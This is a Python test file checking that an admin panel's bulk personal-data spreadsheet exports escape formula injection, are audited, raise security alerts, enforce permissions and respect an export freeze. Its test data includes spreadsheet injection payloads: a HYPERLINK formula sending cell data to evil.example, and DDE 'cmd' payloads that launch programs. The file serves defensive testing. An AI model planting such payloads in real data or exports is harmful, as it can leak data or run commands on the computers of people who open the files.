"""Bulk personal-data exports (members / consents / returns): spreadsheet formula injection is escaped,
every export is audited and raises a security event; permissions enforced."""
from __future__ import annotations

import io

import openpyxl
import pytest

from kv_harness import kv_insert, kv_findall, kv_count, kv_order, kv_iso
from conftest import KvUsers

EVIL = {
    "eq": '=HYPERLINK("http://evil.example/?x="&A1,"tikla")',
    "plus": "+cmd|' /C calc'!A0",
    "minus": "-2+3+cmd|' /C notepad'!A0",
    "at": "@SUM(1+1)*cmd|' /C calc'!A0",
    "tab": "\t=1+1",
}
PLAIN_PHONE = "+90 555 111 22 33"


def _cells(content: bytes) -> list:
    wb = openpyxl.load_workbook(io.BytesIO(content))
    out = []
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                out.append(c)
    return out


def _assert_no_formula(cells):
    for c in cells:
        assert c.data_type != "f", f"formula cell {c.coordinate}: {c.value!r}"
        v = c.value
        if isinstance(v, str) and v and v[0] in "=+-@\t\r":
            assert v == PLAIN_PHONE or v.lstrip("+-").replace(" ", "").replace("(", "").replace(")", "")\
                .replace(".", "").replace("-", "").isdigit(), f"unescaped {c.coordinate}: {v!r}"


def _values(cells):
    return {c.value for c in cells if isinstance(c.value, str)}


def _events(kind):
    return [a for a in kv_findall("audit_logs") if a.get("action") == f"security.{kind}"]


def test_members_export_escapes_formulas_audited(kv_client, kv_users):
    kv_users.customer(email="evil1@example.com", first_name=EVIL["eq"], last_name=EVIL["plus"],
                      phone=PLAIN_PHONE, acquisition_source=EVIL["at"])
    kv_users.customer(email="evil2@example.com", first_name=EVIL["minus"], last_name=EVIL["tab"], phone=EVIL["minus"])
    staff = kv_users.staff(perms=["customers.export"])
    r = kv_client.get("/api/admin/members/export.xlsx", headers=KvUsers.hdr(staff))
    assert r.status_code == 200, r.text
    assert r.headers.get("cache-control", "").startswith("no-store")
    cells = _cells(r.content)
    _assert_no_formula(cells)
    vals = _values(cells)
    for v in (EVIL["eq"], EVIL["plus"], EVIL["at"], EVIL["minus"], EVIL["tab"]):
        assert "'" + v in vals, v
    assert PLAIN_PHONE in vals                           # a real phone number stays readable
    assert not any("$2b$" in str(v) for v in vals)        # no password hashes
    logs = kv_findall("auth_audit_logs", {"event": "members_export"})
    assert len(logs) == 1 and logs[0]["user_id"] == staff["id"] and logs[0]["meta"]["rows"] == 2
    ev = _events("member_export")
    assert len(ev) == 1 and ev[0]["actor"]["id"] == staff["id"]
    phases = [a.get("phase") for a in kv_findall("audit_logs") if a["action"] == "members.export"]
    assert phases == ["intent", "done"]   # fail-closed: intent written before the file was built
    assert kv_count("alerts", {"kind": "member_export"}) == 1


def test_members_export_requires_permission(kv_client, kv_users):
    weak = kv_users.staff(perms=["customers.view"])
    assert kv_client.get("/api/admin/members/export.xlsx", headers=KvUsers.hdr(weak)).status_code == 403
    assert kv_client.get("/api/admin/members/export.xlsx",
                         headers=KvUsers.hdr(kv_users.customer())).status_code == 403
    assert kv_count("auth_audit_logs", {"event": "members_export"}) == 0 and not _events("member_export")


def test_deleted_members_not_exported(kv_client, kv_users):
    kv_users.customer(email="deleted-x@deleted.invalid", first_name="Silinmiş", kvkk_deleted=True)
    kv_users.customer(email="alive@example.com")
    sa = kv_users.staff(super_admin=True)
    r = kv_client.get("/api/admin/members/export.xlsx", headers=KvUsers.hdr(sa))
    vals = _values(_cells(r.content))
    assert "alive@example.com" in vals and "deleted-x@deleted.invalid" not in vals


def test_consents_export_escapes_formulas_audited(kv_client, kv_users):
    kv_users.customer(email="c1@example.com", first_name=EVIL["eq"], last_name="X")
    kv_insert("iys_consents", {"id": "i1", "email": "c1@example.com", "phone": "", "channels": ["EPOSTA"],
                               "status": "ONAY", "source": EVIL["plus"], "consent_date": kv_iso(-1),
                               "created_at": kv_iso(-1)})
    kv_insert("iys_consents", {"id": "i2", "email": EVIL["at"].lower() + "@example.com", "phone": "",
                               "channels": ["EPOSTA"], "status": "ONAY", "source": "HS_WEB",
                               "consent_date": kv_iso(-1), "created_at": kv_iso(-1)})
    # any staff role used to be enough for this bulk PII export → now needs customers.export
    weak = kv_users.staff(perms=["customers.view", "orders.view"])
    assert kv_client.get("/api/admin/consents/export.xlsx", headers=KvUsers.hdr(weak)).status_code == 403
    assert not _events("consent_export")
    staff = kv_users.staff(perms=["customers.export"])
    r = kv_client.get("/api/admin/consents/export.xlsx", headers=KvUsers.hdr(staff))
    assert r.status_code == 200, r.text
    cells = _cells(r.content)
    _assert_no_formula(cells)
    vals = _values(cells)
    assert "'" + EVIL["plus"] in vals
    assert any(v.startswith("'" + EVIL["eq"]) for v in vals)
    assert any(v.startswith("'@") for v in vals)
    aud = [a for a in kv_findall("audit_logs") if a.get("action") == "consents.export"]
    assert len(aud) == 1 and aud[0]["metadata"]["row_count"] == 2
    assert len(_events("consent_export")) == 1
    assert kv_count("alerts", {"kind": "consent_export"}) == 1
    assert kv_client.get("/api/admin/consents/export.xlsx",
                         headers=KvUsers.hdr(kv_users.customer())).status_code == 403


def test_returns_export_escapes_formulas_audited(kv_client, kv_users):
    kv_order(None, status="return_requested", order_number=EVIL["minus"],
             items=[{"product_name": EVIL["at"], "quantity": 1, "price": 100}],
             shipping_address={"first_name": EVIL["eq"], "last_name": "", "phone": PLAIN_PHONE,
                               "email": "ret@example.com", "address": "x", "city": "y"})
    staff = kv_users.staff(perms=["reports.export"])
    r = kv_client.get("/api/admin/rooftr/return-orders/export", headers=KvUsers.hdr(staff))
    assert r.status_code == 200, r.text
    cells = _cells(r.content)
    _assert_no_formula(cells)
    vals = _values(cells)
    assert "'" + EVIL["at"] in vals and "'" + EVIL["eq"] in vals and "'" + EVIL["minus"] in vals
    assert "ret@example.com" not in vals and PLAIN_PHONE not in vals   # contact data not exported
    aud = [a for a in kv_findall("audit_logs") if a.get("action") == "returns.export_xlsx"]
    assert len(aud) == 1 and aud[0]["metadata"]["rows"] == 1
    assert len(_events("returns_export")) == 1
    weak = kv_users.staff(perms=["returns.approve"])
    assert kv_client.get("/api/admin/rooftr/return-orders/export", headers=KvUsers.hdr(weak)).status_code == 403


@pytest.mark.parametrize("path,perm", [("/api/admin/members/export.xlsx", "customers.export"),
                                       ("/api/admin/consents/export.xlsx", "customers.export"),
                                       ("/api/admin/rooftr/return-orders/export", "reports.export")])
def test_frozen_export_writes_no_audit_no_event(kv_client, kv_users, path, perm):
    sa = kv_users.staff(super_admin=True)
    r = kv_client.post("/api/admin/security-switches/freeze_exports", headers=KvUsers.hdr(sa),
                       json={"on": True, "reason": "olay mudahalesi"})
    assert r.status_code == 200
    import security_switches
    security_switches.invalidate_cache()
    staff = kv_users.staff(perms=[perm])
    assert kv_client.get(path, headers=KvUsers.hdr(staff)).status_code == 423
    assert not _events("member_export") and not _events("returns_export") and not _events("consent_export")
